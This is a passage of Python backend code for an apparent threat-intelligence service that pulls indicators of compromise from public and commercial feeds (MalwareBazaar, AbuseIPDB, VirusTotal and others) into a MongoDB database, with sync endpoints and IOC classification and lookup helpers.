            for it in items:
                # Prefer sha256, then sha1, then md5.
                value = (it.get("sha256") or it.get("sha1") or it.get("md5") or "").strip()
                if not value or _classify_ioc(value) not in ("sha256", "sha1", "md5"):
                    skipped += 1
                    continue
                family = (it.get("vx_family") or "").strip() or None
                verdict = (it.get("verdict") or "").strip() or None
                threat_name = family or verdict or "Hybrid Analysis submission"
                tags: List[str] = []
                if family:
                    tags.append(f"family:{family}")
                if verdict:
                    tags.append(f"verdict:{verdict}")
                for t in (it.get("tags") or [])[:8]:
                    ts = str(t).strip()
                    if ts:
                        tags.append(ts)
                sub_type = (it.get("submit_name") or it.get("type") or "").strip()
                notes_bits = []
                if it.get("threat_score") is not None:
                    notes_bits.append(f"threat_score={it.get('threat_score')}")
                if it.get("threat_level") is not None:
                    notes_bits.append(f"threat_level={it.get('threat_level')}")
                if sub_type:
                    notes_bits.append(f"submit={sub_type[:80]}")
                notes = "; ".join(notes_bits) or None
                job_id = it.get("job_id") or it.get("sha256") or ""
                source = f"Hybrid Analysis · {job_id}" if job_id else "Hybrid Analysis"
                try:
                    _, created = await _upsert_ioc(value, threat_name, tags, source, _ha_severity(it), notes)
                    added += 1 if created else 0
                    updated += 0 if created else 1
                except Exception as e:
                    logger.warning(f"Hybrid Analysis upsert failed for {value}: {e}")
                    skipped += 1
    except Exception as e:
        logger.error(f"Hybrid Analysis sync error: {e}")
        return {"error": f"Hybrid Analysis sync error: {e}", "items": len(items), "added": added, "updated": updated, "skipped": skipped}

    summary = {"items": len(items), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "hybrid_analysis"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"Hybrid Analysis sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# AbuseIPDB blacklist sync — pulls top abused IPs and upserts them.
# NOTE: /api/v2/blacklist is a subscriber/paid tier feature on AbuseIPDB.
# On a free key you'll get HTTP 402/403 and this sync returns a friendly error.
# ---------------------------------------------------------------------------
ABUSEIPDB_BLACKLIST_URL = "https://api.abuseipdb.com/api/v2/blacklist"
ABUSEIPDB_BLACKLIST_MAX = 1000
ABUSEIPDB_CONFIDENCE_MIN = 90


async def _sync_abuseipdb_blacklist(limit: int = ABUSEIPDB_BLACKLIST_MAX, confidence_min: int = ABUSEIPDB_CONFIDENCE_MIN) -> dict:
    if not ABUSEIPDB_API_KEY:
        return {"error": "ABUSEIPDB_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = 0
    items: List[dict] = []
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
            r = await hc.get(
                ABUSEIPDB_BLACKLIST_URL,
                params={"confidenceMinimum": confidence_min, "limit": limit},
                headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
            )
            if r.status_code == 402 or r.status_code == 403:
                return {"error": "AbuseIPDB blacklist requires a paid subscription (Basic/Premium tier)", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            if r.status_code != 200:
                return {"error": f"AbuseIPDB blacklist failed ({r.status_code})", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            payload = r.json() or {}
            items = payload.get("data") or []
            for it in items:
                ip = (it.get("ipAddress") or "").strip()
                if not ip or _classify_ioc(ip) != "ip":
                    skipped += 1
                    continue
                score = int(it.get("abuseConfidenceScore") or 0)
                cc = (it.get("countryCode") or "").strip()
                sev = "critical" if score >= 95 else "high" if score >= 90 else "medium"
                tags = ["abuseipdb"]
                if cc:
                    tags.append(f"country:{cc}")
                tags.append(f"confidence:{score}")
                threat_name = f"AbuseIPDB confidence {score}"
                notes = f"Last reported {it.get('lastReportedAt') or 'unknown'}"
                try:
                    _, created = await _upsert_ioc(ip, threat_name, tags, "AbuseIPDB Blacklist", sev, notes)
                    added += 1 if created else 0
                    updated += 0 if created else 1
                except Exception as e:
                    logger.warning(f"AbuseIPDB upsert failed for {ip}: {e}")
                    skipped += 1
    except Exception as e:
        logger.error(f"AbuseIPDB sync error: {e}")
        return {"error": f"AbuseIPDB sync error: {e}", "items": len(items), "added": added, "updated": updated, "skipped": skipped}

    summary = {"items": len(items), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "abuseipdb"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"AbuseIPDB sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# MalwareBazaar bulk sync — pulls the last ~100 sample submissions from
# abuse.ch and upserts their SHA256 hashes into the curated IOC database.
# ---------------------------------------------------------------------------
async def _sync_malwarebazaar_recent(selector: int = 100) -> dict:
    if not MALWAREBAZAAR_API_KEY:
        return {"error": "MALWAREBAZAAR_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = 0
    async with httpx.AsyncClient(timeout=30, follow_redirects=True) as hc:
        feed = await _mb_get_recent(hc, selector=selector)
    if feed.get("error"):
        return {"error": feed["error"], "items": 0, "added": 0, "updated": 0, "skipped": 0}
    samples = feed.get("samples") or []
    for s in samples:
        value = (s.get("sha256_hash") or "").strip()
        if not value or _classify_ioc(value) != "sha256":
            skipped += 1
            continue
        family = (s.get("signature") or "").strip() or None
        file_type = (s.get("file_type") or "").strip() or None
        threat_name = family or file_type or "MalwareBazaar submission"
        tags: List[str] = ["malwarebazaar"]
        if family:
            tags.append(f"family:{family}")
        for t in (s.get("tags") or [])[:8]:
            ts = str(t).strip()
            if ts:
                tags.append(ts)
        source = f"MalwareBazaar · {s.get('sha256_hash')[:12]}"
        notes_bits = []
        if s.get("file_name"):
            notes_bits.append(f"file={s.get('file_name')[:80]}")
        if file_type:
            notes_bits.append(f"type={file_type}")
        if s.get("file_size"):
            notes_bits.append(f"size={s.get('file_size')}")
        if s.get("first_seen"):
            notes_bits.append(f"first_seen={s.get('first_seen')}")
        notes = "; ".join(notes_bits) or None
        # Severity: signed / known malware family = critical, otherwise high (all MB submissions are malware).
        sev = "critical" if family else "high"
        try:
            _, created = await _upsert_ioc(value, threat_name, tags, source, sev, notes)
            added += 1 if created else 0
            updated += 0 if created else 1
        except Exception as e:
            logger.warning(f"MalwareBazaar upsert failed for {value}: {e}")
            skipped += 1
    summary = {"items": len(samples), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "malwarebazaar"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"MalwareBazaar sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Malwarebytes threat-intel blog IOC scraper — pulls the last N articles from
# https://www.malwarebytes.com/search/iocs and extracts the "IOCs" section
# (hashes, defanged domains, defanged IPs) into the curated IOC database.
# No API key required (public content).
# ---------------------------------------------------------------------------
MWB_SEARCH_URL = "https://www.malwarebytes.com/blog/feed/"
MWB_MAX_ARTICLES = 12        # per sync run — enough to be fresh without hammering
MWB_MAX_IOCS_PER_TYPE = 50   # per-article cap to defend against poorly-structured pages


def _refang(v: str) -> str:
    """Refang defanged IOCs: `foo[.]bar` -> `foo.bar`, `hxxp[s]://` -> `http[s]://`."""
    if not v:
        return v
    v = v.replace("[.]", ".").replace("(.)", ".").replace("{.}", ".")
    v = v.replace("[:]", ":").replace("hxxps://", "https://").replace("hxxp://", "http://")
    return v.strip().strip(",;'\"`")


_HASH_RE = re.compile(r"\b([a-fA-F0-9]{64}|[a-fA-F0-9]{40}|[a-fA-F0-9]{32})\b")
_IP_RE   = re.compile(r"\b(\d{1,3}(?:[\.\[\]]+\d{1,3}){3})\b")
_DOMAIN_RE = re.compile(r"\b([a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(?:[\[\.\]]+[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?){1,4})\b")


def _extract_iocs_from_article(md: str) -> dict:
    """Return {hashes: [str], ips: [str], domains: [str]} from an article body.
    Restricts extraction to the '## IOCs' / 'Indicators of Compromise' section to
    reduce false positives (author bios, external references, changelog dates, etc.)."""
    if not md:
        return {"hashes": [], "ips": [], "domains": []}
    # Find the IOC section.
    m = re.search(r"(?is)#+\s*(iocs?|indicators of compromise)\s*\n(.*?)(\n#+\s|\Z)", md)
    body = m.group(2) if m else md  # fall back to full body if no explicit section
    hashes = list({h.lower() for h in _HASH_RE.findall(body)})[:MWB_MAX_IOCS_PER_TYPE]
    ips: list[str] = []
    for raw in _IP_RE.findall(body)[:MWB_MAX_IOCS_PER_TYPE * 3]:
        ip = _refang(raw)
        if _classify_ioc(ip) == "ip" and ip not in ips:
            ips.append(ip)
            if len(ips) >= MWB_MAX_IOCS_PER_TYPE:
                break
    domains: list[str] = []
    for raw in _DOMAIN_RE.findall(body)[:MWB_MAX_IOCS_PER_TYPE * 4]:
        # Only accept if it was defanged in-source (avoids matching URLs of the article itself, etc.).
        if "[.]" not in raw and "[.]" not in body[max(0, body.find(raw) - 5):body.find(raw) + len(raw) + 5]:
            continue
        d = _refang(raw).lower().strip(".")
        if _classify_ioc(d) == "domain" and d not in domains and d not in ("malwarebytes.com", "wp-content.com"):
            domains.append(d)
            if len(domains) >= MWB_MAX_IOCS_PER_TYPE:
                break
    return {"hashes": hashes, "ips": ips, "domains": domains}


async def _sync_malwarebytes_iocs(max_articles: int = MWB_MAX_ARTICLES) -> dict:
    added = updated = skipped = 0
    articles_processed = 0
    async with httpx.AsyncClient(timeout=25, follow_redirects=True, headers={"User-Agent": "NivX-ThreatIntel/1.0"}) as hc:
        try:
            r = await hc.get(MWB_SEARCH_URL)
            if r.status_code != 200:
                return {"error": f"Malwarebytes search HTTP {r.status_code}", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            # Extract article links from the RSS feed.
            links = re.findall(r"<link>([^<]+)</link>", r.text)
            seen = set()
            article_urls: list[str] = []
            for u in links:
                if u in seen:
                    continue
                seen.add(u)
                # Only accept full-slug article URLs (skip category / feed / home).
                if re.search(r"/blog/[a-z\-]+/\d{4}/\d{2}/[a-z0-9\-]+", u):
                    article_urls.append(u)
                if len(article_urls) >= max_articles:
                    break
        except Exception as e:
            return {"error": f"Malwarebytes listing error: {e}", "items": 0, "added": 0, "updated": 0, "skipped": 0}

        for url in article_urls:
            try:
                ar = await hc.get(url)
                if ar.status_code != 200:
                    continue
                articles_processed += 1
                title_m = re.search(r"<title>([^<]+)</title>", ar.text)
                title = (title_m.group(1) if title_m else "Malwarebytes article").split("|")[0].strip()
                iocs = _extract_iocs_from_article(ar.text)
                slug = url.rstrip("/").split("/")[-1][:60]
                src = f"Malwarebytes · {slug}"
                notes = title[:180]
                for h in iocs["hashes"]:
                    try:
                        _, created = await _upsert_ioc(h, title[:80], ["malwarebytes"], src, "high", notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
                for ip in iocs["ips"]:
                    try:
                        _, created = await _upsert_ioc(ip, title[:80], ["malwarebytes", "c2"], src, "high", notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
                for d in iocs["domains"]:
                    try:
                        _, created = await _upsert_ioc(d, title[:80], ["malwarebytes", "c2"], src, "high", notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
            except Exception as e:
                logger.warning(f"Malwarebytes article fetch failed for {url}: {e}")
                continue

    summary = {"items": articles_processed, "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "malwarebytes"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"Malwarebytes sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# VirusTotal Enterprise sync — pulls Livehunt-matched files (YARA hits) and
# the unified IOC Stream (files/urls/domains/ips) into the curated IOC DB.
# Requires an ENTERPRISE key; free-tier keys will 401 and we log-and-skip
# so nothing else breaks.
# ---------------------------------------------------------------------------
VT_INTEL_LIVEHUNT_URL   = "https://www.virustotal.com/api/v3/intelligence/hunting_notification_files"
VT_INTEL_IOC_STREAM_URL = "https://www.virustotal.com/api/v3/intelligence/ioc_stream_notifications"
VT_INTEL_MAX_ITEMS = 200


def _vt_severity(stats: dict) -> str:
    mal = int((stats or {}).get("malicious") or 0)
    susp = int((stats or {}).get("suspicious") or 0)
    if mal >= 20:
        return "critical"
    if mal >= 5:
        return "high"
    if mal >= 1 or susp >= 3:
        return "medium"
    return "low"


async def _sync_virustotal_intel(max_items: int = VT_INTEL_MAX_ITEMS) -> dict:
    """VT Enterprise: pull Livehunt file matches + IOC Stream notifications and
    upsert them into the `iocs` collection. Non-enterprise keys yield a friendly
    'not_enterprise' skip, not an error."""
    if not VT_API_KEY:
        return {"error": "VIRUSTOTAL_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = items_seen = 0
    headers = {"x-apikey": VT_API_KEY, "accept": "application/json"}
    async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
        # 1) Livehunt file matches
        try:
            r = await hc.get(VT_INTEL_LIVEHUNT_URL, headers=headers, params={"limit": min(40, max_items)})
            if r.status_code in (401, 403):
                return {"skipped": True, "reason": "VT Enterprise tier required (free-tier key detected)", "items": 0, "added": 0, "updated": 0}
            if r.status_code == 200:
                payload = r.json() or {}
                for it in (payload.get("data") or [])[:max_items]:
                    items_seen += 1
                    attrs = it.get("attributes") or {}
                    ctx = it.get("context_attributes") or {}
                    sha256 = attrs.get("sha256") or it.get("id")
                    if not sha256:
                        skipped += 1
                        continue
                    stats = attrs.get("last_analysis_stats") or {}
                    name = attrs.get("meaningful_name") or (ctx.get("rule_name") and f"Livehunt: {ctx['rule_name']}") or "VT Livehunt match"
                    tags = ["virustotal", "livehunt"]
                    if ctx.get("rule_name"):
                        tags.append(f"rule:{ctx['rule_name']}")
                    for t in (ctx.get("tags") or [])[:6]:
                        if t:
                            tags.append(str(t))
                    notes = f"vt_stats={stats.get('malicious',0)}m/{stats.get('suspicious',0)}s · {attrs.get('type_description') or ''}".strip(" ·")
                    try:
                        _, created = await _upsert_ioc(sha256, name[:80], tags, f"VirusTotal Livehunt · {sha256[:8]}", _vt_severity(stats), notes[:180])
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
        except Exception as e:
            logger.warning(f"VT Livehunt fetch failed: {e}")

        # 2) IOC Stream — unified files/urls/domains/ips notifications
        try:
            r = await hc.get(VT_INTEL_IOC_STREAM_URL, headers=headers, params={"limit": min(40, max_items)})
            if r.status_code == 200:
                payload = r.json() or {}
                for it in (payload.get("data") or [])[:max_items]:
                    items_seen += 1
                    ent = (it.get("context_attributes") or {}).get("notification_source_key") or ""
                    ent_type = it.get("type", "")
                    # IOC Stream returns nested "attributes" per object type.
                    attrs = it.get("attributes") or {}
                    value = None
                    if ent_type in ("file", "hunting_notification"):
                        value = attrs.get("sha256") or it.get("id")
                    elif ent_type in ("domain", "domain_notification"):
                        value = attrs.get("id") or it.get("id")
                    elif ent_type in ("url", "url_notification"):
                        value = attrs.get("url") or attrs.get("id")
                    elif ent_type in ("ip_address", "ip_notification"):
                        value = attrs.get("id") or it.get("id")
                    else:
                        value = it.get("id")
                    if not value or _classify_ioc(str(value)) == "unknown":
                        skipped += 1
                        continue
                    stats = attrs.get("last_analysis_stats") or {}
                    tags = ["virustotal", "ioc-stream"]
                    if ent:
                        tags.append(f"stream:{ent}")
                    try:
                        _, created = await _upsert_ioc(str(value), "VT IOC Stream match", tags, "VirusTotal IOC Stream", _vt_severity(stats), None)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
        except Exception as e:
            logger.warning(f"VT IOC Stream fetch failed: {e}")

    summary = {"items": items_seen, "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "virustotal"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"VirusTotal Enterprise sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Community-blocklist sync — Cisco Talos gates bulk downloads behind login/CF,
# so we source from the industry-standard public feeds that also power Talos'
# community lists: Emerging Threats compromised-IPs + Abuse.ch Feodo Tracker.
# Both refresh hourly, no key required.
# ---------------------------------------------------------------------------
TALOS_COMMUNITY_FEEDS = [
    ("Emerging Threats compromised-ips", "https://rules.emergingthreats.net/blockrules/compromised-ips.txt", ["talos", "et-community", "blocklist"]),
    ("Feodo Tracker (abuse.ch)",         "https://feodotracker.abuse.ch/downloads/ipblocklist_recommended.txt", ["talos", "feodo-tracker", "botnet-c2"]),
]


async def _sync_talos_blocklist() -> dict:
    added = updated = skipped = total_ips = 0
    async with httpx.AsyncClient(timeout=20, follow_redirects=True, headers={"User-Agent": "NivX-ThreatIntel/1.0"}) as hc:
        for label, url, tags in TALOS_COMMUNITY_FEEDS:
            try:
                r = await hc.get(url)
                if r.status_code != 200:
                    logger.warning(f"{label} HTTP {r.status_code}")
                    continue
                for line in r.text.splitlines():
                    s = line.strip()
                    if not s or s.startswith("#"):
                        continue
                    if _classify_ioc(s) != "ip":
                        continue
                    total_ips += 1
                    if total_ips > 4000:  # global cap across all feeds
                        break
                    try:
                        _, created = await _upsert_ioc(s, f"{label} entry", tags, label, "high", "Community IP blocklist")
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
            except Exception as e:
                logger.warning(f"{label} fetch error: {e}")
                continue
    summary = {"items": total_ips, "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "talos"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"Talos-community blocklist sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Multi-source curated-IOC sync orchestrator (One-click "Sync all sources")
# ---------------------------------------------------------------------------
SYNC_SOURCES = [
    # key,             display name,        can_sync, reason_if_not
    ("otx",             "AlienVault OTX",    True,  None),
    ("hybrid_analysis", "Hybrid Analysis",   True,  None),
    ("abuseipdb",       "AbuseIPDB",         True,  None),
    ("malwarebazaar",   "MalwareBazaar",     True,  None),
    ("malwarebytes",    "Malwarebytes Labs", True,  None),
    ("virustotal",      "VirusTotal (Enterprise)", True, None),
    ("talos",           "Talos-Community Blocklists (ET + Feodo)", True,  None),
    ("urlscan",         "URLScan.io",        False, "Bulk 'malicious verdicts' search requires urlscan Pro"),
    ("shodan",          "Shodan",            False, "Not a curated IOC feed (internet scan engine)"),
]


@api_router.get("/iocs/sync-status")
async def iocs_sync_status():
    metas = {}
    async for doc in db.sync_meta.find({}, {"_id": 1, "items": 1, "pulses": 1, "indicators": 1, "added": 1, "updated": 1, "skipped": 1, "synced_at": 1, "error": 1}):
        metas[doc["_id"]] = {k: v for k, v in doc.items() if k != "_id"}
    # OTX still has its own doc under otx_meta for backwards-compat.
    otx_doc = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})
    if otx_doc and "otx" not in metas:
        metas["otx"] = otx_doc

    key_map = {
        "otx": bool(OTX_API_KEY),
        "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
        "abuseipdb": bool(ABUSEIPDB_API_KEY),
        "malwarebazaar": bool(MALWAREBAZAAR_API_KEY),
        "malwarebytes": True,
        "urlscan": bool(URLSCAN_API_KEY) if 'URLSCAN_API_KEY' in globals() else False,
        "virustotal": bool(VT_API_KEY) if 'VT_API_KEY' in globals() else False,
        "talos": True,
        "shodan": False,
    }
    sources = []
    for key, label, can_sync, reason in SYNC_SOURCES:
        sources.append({
            "key": key,
            "label": label,
            "can_sync": can_sync,
            "reason": reason,
            "configured": key_map.get(key, False),
            "last_sync": metas.get(key),
        })
    return {"sources": sources}


@api_router.post("/iocs/sync-all")
async def iocs_sync_all(user: dict = Depends(get_current_user)):
    """One-click sync across every source that provides a bulk IOC feed.
    Runs OTX + Hybrid Analysis + AbuseIPDB + MalwareBazaar + Malwarebytes +
    VT Enterprise + Cisco Talos in parallel. Sources without a public bulk
    feed (URLScan / Shodan) are reported as skipped."""
    tasks = {
        "otx": _sync_otx_pulses() if OTX_API_KEY else None,
        "hybrid_analysis": _sync_hybrid_analysis_feed() if HYBRID_ANALYSIS_API_KEY else None,
        "abuseipdb": _sync_abuseipdb_blacklist() if ABUSEIPDB_API_KEY else None,
        "malwarebazaar": _sync_malwarebazaar_recent() if MALWAREBAZAAR_API_KEY else None,
        "malwarebytes": _sync_malwarebytes_iocs(),
        "virustotal": _sync_virustotal_intel() if VT_API_KEY else None,
        "talos": _sync_talos_blocklist(),
    }
    active_keys = [k for k, v in tasks.items() if v is not None]
    results_list = await asyncio.gather(*[tasks[k] for k in active_keys], return_exceptions=True)
    results: dict = {}
    total_added = total_updated = 0
    for k, r in zip(active_keys, results_list):
        if isinstance(r, Exception):
            results[k] = {"error": str(r)}
        else:
            results[k] = r
            total_added += int(r.get("added") or 0)
            total_updated += int(r.get("updated") or 0)

    # Fill in skipped sources so the client can render a complete status.
    for key, label, can_sync, reason in SYNC_SOURCES:
        if key in results:
            continue
        if not can_sync:
            results[key] = {"skipped": True, "reason": reason}
        else:
            results[key] = {"error": f"{label} is not configured"}

    return {
        "totals": {"added": total_added, "updated": total_updated},
        "results": results,
        "synced_at": now_iso(),
    }





# ---------------------------------------------------------------------------
# Live external threat feed (CISA Known Exploited Vulnerabilities)
# ---------------------------------------------------------------------------
_feed_cache: dict[str, Any] = {"ts": None, "data": None}


# ---------------------------------------------------------------------------
# Smart IOC lookup / enrichment (key-free sources + prefilled deep links)
# ---------------------------------------------------------------------------
def _classify_ioc(value: str) -> str:
    v = value.strip()
    if re.fullmatch(r"[a-fA-F0-9]{64}", v):
        return "sha256"
    if re.fullmatch(r"[a-fA-F0-9]{40}", v):
        return "sha1"
    if re.fullmatch(r"[a-fA-F0-9]{32}", v):
        return "md5"
    if re.fullmatch(r"(\d{1,3}\.){3}\d{1,3}", v):
        return "ip"
    if v.lower().startswith(("http://", "https://")):
        return "url"
    if re.fullmatch(r"([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}", v.replace("[.]", ".")):
        return "domain"
    return "unknown"


def _ioc_links(value: str, kind: str) -> dict:
    v = value.strip().replace("[.]", ".")
    from urllib.parse import quote
    q = quote(v, safe="")
    links = {}
    if kind in ("md5", "sha1", "sha256"):
        links["VirusTotal"] = f"https://www.virustotal.com/gui/file/{v}"
        links["MalwareBazaar"] = f"https://bazaar.abuse.ch/browse.php?search={kind}%3A{v}"
        links["ThreatFox"] = f"https://threatfox.abuse.ch/browse.php?search=hash%3A{v}"
        links["Hybrid Analysis"] = f"https://www.hybrid-analysis.com/search?query={v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/malware/{v}"
    elif kind == "ip":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/ip-address/{v}"
        links["AbuseIPDB"] = f"https://www.abuseipdb.com/check/{v}"
        links["Cisco Talos"] = f"https://talosintelligence.com/reputation_center/lookup?search={v}"
        links["Shodan"] = f"https://www.shodan.io/host/{v}"
        links["GreyNoise"] = f"https://viz.greynoise.io/ip/{v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/ip/{v}"
    elif kind == "domain":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/domain/{v}"
        links["urlscan.io"] = f"https://urlscan.io/search/#{q}"
        links["Cisco Talos"] = f"https://talosintelligence.com/reputation_center/lookup?search={v}"
        links["Shodan"] = f"https://www.shodan.io/search?query=hostname%3A{v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/url/{v}"
    elif kind == "url":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/search/{q}"
        links["urlscan.io"] = f"https://urlscan.io/search/#{q}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/url/{q}"
    return links


# ---------------------------------------------------------------------------
# Optional key-based reputation providers (VirusTotal v3 + AbuseIPDB v2)
# Keys are OPTIONAL: absent keys are skipped gracefully. Results are cached in
# MongoDB (ioc_cache) for 6h to conserve free-tier daily quotas.
# ---------------------------------------------------------------------------
VT_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY")
ABUSEIPDB_API_KEY = os.environ.get("ABUSEIPDB_API_KEY")
URLSCAN_API_KEY = os.environ.get("URLSCAN_API_KEY")
EMERGENT_LLM_KEY = os.environ.get("EMERGENT_LLM_KEY")
HYBRID_ANALYSIS_API_KEY = os.environ.get("HYBRID_ANALYSIS_API_KEY")
MALWAREBAZAAR_API_KEY = os.environ.get("MALWAREBAZAAR_API_KEY")
_MB_URL = "https://mb-api.abuse.ch/api/v1/"
_HA_BASE = "https://hybrid-analysis.com/api/v2"  # non-www — www 301-redirects and Cloudflare drops POST bodies
_HA_HEADERS = {"api-key": HYBRID_ANALYSIS_API_KEY or "", "User-Agent": "Falcon Sandbox", "Accept": "application/json"}
_REP_TTL = timedelta(hours=6)


async def _mb_hash_lookup(hc: httpx.AsyncClient, hash_value: str) -> Optional[dict]:
    """MalwareBazaar `get_info` lookup. Accepts SHA256/SHA1/MD5.
    Returns None when disabled, or an enrichment dict on success:
      {found, sha256, sha1, md5, signature, file_name, file_type, file_size,
       first_seen, tags[], delivery_method, intelligence, reporter, url}
    """
    if not MALWAREBAZAAR_API_KEY:
        return None
    if _classify_ioc(hash_value) not in ("sha256", "sha1", "md5"):
        return {"skipped": True, "reason": "hash_required"}
    try:
        r = await hc.post(
            _MB_URL,
            data={"query": "get_info", "hash": hash_value},
            headers={"Auth-Key": MALWAREBAZAAR_API_KEY},
            timeout=15,
        )
        if r.status_code != 200:
            return {"error": f"MB HTTP {r.status_code}"}
        j = r.json() or {}
        status = j.get("query_status")
        if status in ("hash_not_found", "no_results"):
            return {"found": False}
        if status not in ("ok",):
            return {"error": f"MB status={status}"}
        data = (j.get("data") or [])
        if not data:
            return {"found": False}
        d = data[0] or {}
        return {
            "found": True,
            "sha256": d.get("sha256_hash"),
            "sha1": d.get("sha1_hash"),
            "md5": d.get("md5_hash"),
            "signature": d.get("signature"),
            "file_name": d.get("file_name"),
            "file_type": d.get("file_type"),
            "file_size": d.get("file_size"),
            "first_seen": d.get("first_seen"),
            "last_seen": d.get("last_seen"),
            "tags": d.get("tags") or [],
            "delivery_method": d.get("delivery_method"),
            "intelligence": {
                "downloads": (d.get("intelligence") or {}).get("downloads"),
                "uploads": (d.get("intelligence") or {}).get("uploads"),
            } if d.get("intelligence") else None,
            "reporter": d.get("reporter"),
            "url": f"https://bazaar.abuse.ch/sample/{d.get('sha256_hash')}/" if d.get("sha256_hash") else None,
        }
    except Exception as e:
        return {"error": f"MB error: {e}"}


async def _mb_get_recent(hc: httpx.AsyncClient, selector: int = 100) -> dict:
    """MalwareBazaar `get_recent` — last N sample submissions. Returns raw sample list."""
    if not MALWAREBAZAAR_API_KEY:
        return {"error": "MALWAREBAZAAR_API_KEY not configured", "samples": []}
    try:
        r = await hc.post(
            _MB_URL,
            data={"query": "get_recent", "selector": str(selector)},
            headers={"Auth-Key": MALWAREBAZAAR_API_KEY},
            timeout=25,
        )
        if r.status_code != 200:
            return {"error": f"MB HTTP {r.status_code}", "samples": []}
        j = r.json() or {}
        return {"query_status": j.get("query_status"), "samples": j.get("data") or []}
    except Exception as e:
        return {"error": f"MB error: {e}", "samples": []}


async def _ha_hash_lookup(hc: httpx.AsyncClient, hash_value: str) -> Optional[dict]:
    """Look up a hash on Hybrid Analysis. Uses /overview/{sha256} (v2 replacement
    for deprecated /search/hash). Returns None when disabled, {'skipped':True} for
    non-SHA256 hashes since HA overview requires SHA256."""
    if not HYBRID_ANALYSIS_API_KEY:
        return None
    kind = _classify_ioc(hash_value)
    if kind != "sha256":
        return {"skipped": True, "reason": "sha256_required"}
    try:
        r = await hc.get(
            f"{_HA_BASE}/overview/{hash_value}",
            headers=_HA_HEADERS,
            follow_redirects=True,
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code == 404:
            return {"found": False}
        if r.status_code != 200:
            return {"error": "request_failed"}
        d = r.json() or {}
        if not d.get("sha256"):
            return {"found": False}
        # Pick top vx_family from scanners[].family if present.
        family = None
        for sc in (d.get("scanners") or []):
            if sc.get("family"):
                family = sc["family"]
                break
        classification = d.get("classification_tags") or []
        return {
            "found": True,
            "verdict": d.get("verdict"),
            "threat_score": d.get("threat_score"),
            "vx_family": family,
            "classification": classification[:5],
            "type_short": d.get("type_short"),
            "last_file_name": d.get("last_file_name"),
            "size": d.get("size"),
            "reports": len(d.get("children") or []) + 1,
            "url": f"https://www.hybrid-analysis.com/sample/{d['sha256']}",
            "submitted_at": d.get("last_multi_scan") or d.get("analysis_start_time"),
        }
    except Exception:
        return {"error": "request_failed"}


async def _ha_search_terms(hc: httpx.AsyncClient, params: dict, limit: int = 12) -> Optional[dict]:
    """Search HA for sandboxed samples matching the given terms (host/domain/url/etc).
    `params` is a dict like {'host': '1.2.3.4'} or {'domain': 'example.com'}.
    Returns normalized {count, families:[...], samples:[...]} or None if disabled."""
    if not HYBRID_ANALYSIS_API_KEY:
        return None
    try:
        r = await hc.post(f"{_HA_BASE}/search/terms", data=params, headers={**_HA_HEADERS, "Content-Type": "application/x-www-form-urlencoded"})
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": "request_failed"}
        j = r.json() or {}
        results = j.get("result") or []
        if not results:
            return {"found": False, "count": 0, "families": [], "samples": []}
        # Aggregate families
        fam_counts: dict = {}
        for x in results:
            f = (x.get("vx_family") or "").strip()
            if f:
                fam_counts[f] = fam_counts.get(f, 0) + 1
